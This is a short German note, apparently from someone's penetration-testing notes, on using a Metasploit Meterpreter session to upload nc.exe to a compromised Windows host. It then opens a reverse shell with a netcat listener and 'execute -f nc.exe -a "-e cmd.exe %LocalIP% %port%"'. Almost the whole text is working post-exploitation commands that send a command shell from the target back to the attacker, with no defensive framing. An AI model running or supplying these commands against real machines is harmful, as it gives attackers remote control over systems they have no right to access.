# Metasploit

## Mit Metasploit Reverse TCP-Shell erstellen

Mit `lcd` den lokalen Ordner wechseln, dort wo nc.exe liegt.
Anschließend mit dem Meterpreter in einen beschreibaren Ordner wechseln und mit `upload nc.exe` nc hochladen.
Auf der lokalen Maschine mit  `nc -lvp %port%` einen Listener öffnen.
Beim Remoterechner muss nun folgendes im Ordner, wo nc hochgeladen wurde, ausgeführt werden `execute -f nc.exe -a "-e cmd.exe %LocalIP% %port%"`
